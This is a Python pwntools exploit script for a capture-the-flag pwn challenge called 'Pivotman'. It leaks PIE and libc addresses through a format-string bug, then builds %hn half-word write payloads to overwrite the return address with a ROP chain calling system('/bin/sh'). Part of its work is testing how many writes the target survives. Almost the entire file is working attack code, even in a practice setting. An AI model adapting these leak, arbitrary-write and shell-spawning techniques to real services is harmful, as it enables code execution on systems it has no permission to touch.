#!/usr/bin/env python3
"""Test different numbers of %hn writes to find crash boundary"""
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

CHALL_DIR = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Easy/Pivotman/pwn_pivotman/challenge'
LD_PATH = f'{CHALL_DIR}/ld-linux-x86-64.so.2'
libc = ELF(f'{CHALL_DIR}/libc.so.6', checksec=False)

def test_writes(n_writes, p):
    """Test writing n_writes half-words. Returns True if program survives."""
    # Get fresh leaks
    p.sendline(b'BKDR %2737$p.%2736$p')
    resp = p.recvuntil(b' \r\n')
    idx = resp.find(b' BKDR ')
    after = resp[idx + 6:].split(b'.')
    pie_base = int(after[0], 16) - 0x3a10
    saved_rbp = int(after[1], 16)
    
    puts_got = pie_base + 0x5ed8
    p.sendline(b'BKDR ' + b'%1032$sA' + p64(puts_got))
    data = p.recvuntil(b'A', timeout=5)
    idx = data.find(b' BKDR ')
    leaked = data[idx + 6:-1]
    puts_addr = u64(leaked[:8].ljust(8, b'\x00'))
    libc_base = puts_addr - libc.symbols['puts']
    
    ret_addr_loc = saved_rbp - 8
    ret_gadget = libc_base + 0x26699
    pop_rdi = libc_base + 0x28a55
    binsh = libc_base + 0x1abf05
    system = libc_base + libc.symbols['system']
    
    writes_dict = {}
    if n_writes >= 1: writes_dict[ret_addr_loc] = ret_gadget
    if n_writes >= 2: writes_dict[ret_addr_loc + 8] = pop_rdi
    if n_writes >= 3: writes_dict[ret_addr_loc + 16] = binsh
    if n_writes >= 4: writes_dict[ret_addr_loc + 24] = system
    
    payload = build_fmt_write_payload(writes_dict)
    print(f'  n_writes={n_writes}, payload={len(payload)}B, dict_size={len(writes_dict)}')
    
    p.sendline(payload)
    import time; time.sleep(0.3)
    try:
        p.recv(timeout=1)
        p.sendline(b'BKDR ALIVE_CHECK')
        resp = p.recv(timeout=2)
        alive = b'ALIVE_CHECK' in resp
        if alive:
            print(f'  -> SURVIVED')
        else:
            print(f'  -> alive but unexpected response: {resp[:80]}')
        return alive
    except (EOFError, Exception) as e:
        print(f'  -> CRASHED ({e})')
        return False

def build_fmt_write_payload(writes_dict):
    hw = []
    for addr, val in writes_dict.items():
        for j in range(4):
            hw.append((addr + j * 2, (val >> (j * 16)) & 0xffff))
    hw.sort(key=lambda x: x[1])
    
    if not hw:
        return b'BKDR test'
    
    current = 0
    fmt_dummy = b''
    for _, val in hw:
        delta = (val - current) % 0x10000
        if delta == 0: delta = 0x10000
        fmt_dummy += f'%{delta}c%1000$hn'.encode()
        current = val
    
    total_before_buf = 3 + 5 + len(fmt_dummy)
    padding = (8 - total_before_buf % 8) % 8
    first_pos = 1030 + (total_before_buf + padding) // 8
    
    current = 0
    fmt = b''
    for idx, (addr, val) in enumerate(hw):
        pos = first_pos + idx
        delta = (val - current) % 0x10000
        if delta == 0: delta = 0x10000
        fmt += f'%{delta}c%{pos}$hn'.encode()
        current = val
    
    padding = (8 - (3 + 5 + len(fmt)) % 8) % 8
    fmt += b'.' * padding
    
    addrs = b''
    for addr, _ in hw:
        addrs += p64(addr)
    
    return b'BKDR ' + fmt + addrs

# Test each write count with fresh process
for n in range(1, 5):
    p = process([LD_PATH, f'{CHALL_DIR}/chall'], cwd=CHALL_DIR)
    p.recvuntil(b' \r\n', timeout=10)
    p.sendline(b'USER ;)')
    p.recvuntil(b' \r\n')
    p.sendline(b'PASS ;)')
    p.recvuntil(b' \r\n')
    survived = test_writes(n, p)
    p.close()
    print(f'  n_writes={n}: {"OK" if survived else "FAIL"}')
    if not survived:
        break
